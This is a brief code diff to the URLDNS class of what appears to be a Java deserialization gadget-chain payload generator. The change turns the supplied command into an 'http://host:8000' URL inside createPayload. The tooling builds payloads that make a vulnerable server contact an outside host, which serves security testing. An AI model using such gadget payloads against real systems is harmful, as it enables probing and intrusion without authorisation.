@@ -27,6 +27,8 @@ public class URLDNS extends GadgetChain<HashCodeTrampoline> {
 
     @Override
     protected TrampolineConnector createPayload(String command) throws Exception {
+        command = "http://" + command + ":8000";
+
         URLStreamHandler handler = new SilentURLStreamHandler();
         this.url = new URL(null, command, handler);
 
